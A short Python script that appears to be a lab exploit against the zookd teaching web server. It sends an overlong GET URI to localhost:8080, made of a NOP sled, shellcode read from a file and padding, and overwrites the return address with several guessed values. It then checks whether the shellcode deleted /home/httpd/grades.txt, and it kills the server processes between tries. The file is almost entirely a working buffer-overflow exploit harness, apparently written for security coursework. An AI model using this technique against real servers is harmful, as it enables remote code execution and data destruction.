#!/usr/bin/python
import socket, struct, time, os, subprocess, sys

shellcode = open("shellcode.bin").read()
nop = "\x90" * 32
sc = nop + shellcode
RET_URI_OFF = 1024 - 15 + 16

def run(addr):
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.3)
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"))
    time.sleep(1)
    uri = "/" + sc + "A" * ((RET_URI_OFF - 1) - len("/" + sc))
    uri += struct.pack("<I", addr & 0xffffffff)
    req = "GET " + uri + " HTTP/1.0\r\n\r\n"
    print("try", hex(addr), "uri_len", len(uri), "bad", any(ord(c) in (0,10,13) for c in req.split("\r\n")[0]))
    s = socket.socket()
    s.connect(("localhost", 8080))
    s.send(req)
    s.close()
    time.sleep(0.5)
    exists = os.path.exists("/home/httpd/grades.txt")
    print("grades exists:", exists)
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")

for a in [0xfffffbf00, 0xfffffc100, 0xfffffc000, 0xfffffbe00, 0xfffffc0f0]:
    run(a)
